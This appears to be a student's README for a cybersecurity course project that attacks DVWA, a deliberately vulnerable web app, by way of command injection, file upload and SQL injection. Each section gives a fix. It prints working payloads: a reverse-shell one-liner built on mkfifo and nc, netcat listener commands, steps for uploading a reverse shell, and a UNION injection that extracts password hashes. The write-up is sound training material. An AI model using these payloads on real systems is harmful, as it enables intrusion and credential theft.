# Web-Hack

## [Subject](https://github.com/01-edu/public/tree/master/subjects/cybersecurity/web-hack)

## [Audit](https://github.com/01-edu/public/tree/master/subjects/cybersecurity/web-hack/audit)

## [Video▶️](https://youtu.be/PScAwe4ON5A)

## Table Of Contents

- [Vulnerabilities](#vulnerabilities)
  - [1. Command line injection](#1-command-line-injection)
  - [2. File upload](#2-file-upload)
  - [3. SQL injection](#3-sql-injection)
- [Author](#author)

### 1. Command line injection

**Explanation:**

Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection is possible when the application passes user-submitted data to a system shell.
DVWA site has a form field that asks for an IP address. It runs a ping command with given IP and returns the result.

**Usage:**

By using `&&` operator or a semicolon `;` we can run any command after the IP address.

Example:

```sh
127.0.0.1; whoami; hostname; ifconfig
```

Examle of getting reverse shell access through command injection:

Set your mashine to listen to a port:

```sh
nc -lvnp 1337
```

Submit this via form field:

```sh
127.0.0.1 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 127.0.0.1 1337 >/tmp/f
```

With this we have shell access

**Fix:**

Only allow very stricted input that has to match a pattern and can only produce a certain result. Use white listing to only allow certain values to be entered.

### 2. File upload

**Explanation:**

File upload vulnerability is a security flaw that occurs when a web application allows users to upload files without proper validation or security controls.
Uploaded files represent a significant risk to applications. Alot of attacks begin by uploading some malicious file to the system. After file is uploaded the attacker just has to find a way to execute it, and the system is comprimised.

**Usage:**

If there are no limitations at all what user can upload just upload a for example a reverse shell script and execute it to gain shell access.
If Only file type is limited, you can use a proxy and some repeater software where you can send the upload request manually to the server and change the file type in the header

Example:

1. Upload shell sctipt file where you have set your ip and a port for listening
2. listen to the port with netcat:

```sh
nc -lvnp 1337
```

3. Go to file directory on the web application and execute the script.
4. Open the console you had set to listen to your chosen port and it should have a connection to the web applications system shell.

**Fix:**

Check the reported file type from the client when it's being uploaded. When image is received from client server should try to resize it to make sure we're dealing with an image. Finally to have the best possible security the server should re-encode the image to strip away anything that could be hinden in the image file.

### 3. SQL injection

**Explanation:**

SQL injection is a type of cyberattack where malicious SQL code is inserted into input fields of a web application, exploiting vulnerabilities in the application's database layer. This can lead to unauthorized access to sensitive data, manipulation of database content, and potentially complete control over the application and underlying server.

**Usage:**

Example - getting user password hashes from the db using UNION attack method:

The UNION keyword enables you to execute one or more additional SELECT queries and append the results to the original query.

For a UNION query to work, two key requirements must be met:

- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

In this case we know that the original query returns 2 columns so we can just attach another query with 2 colmuns and get the password hashes of the users.

```sql
' UNION SELECT user, password FROM users#
```

With the single quote `'` symbol is used to "break out" of the `id` parameter in the query, thus allowing us to continue the query.
The `#` symbol is used to comment out the rest of the original query following the injection point.

From here there are several tools and methods to crack the hashes and get the passwords of the users.

**Fix:**

**Validate** and **sanitize** user **input** to ensure that only expected data formats are accepted.

Utilize **parameterized queries** or **prepared statements**, these methods allow input values to be treated as data rather than executable code, preventing SQL injection attacks.

## Author

[laurilaretei](https://01.kood.tech/git/laurilaretei)
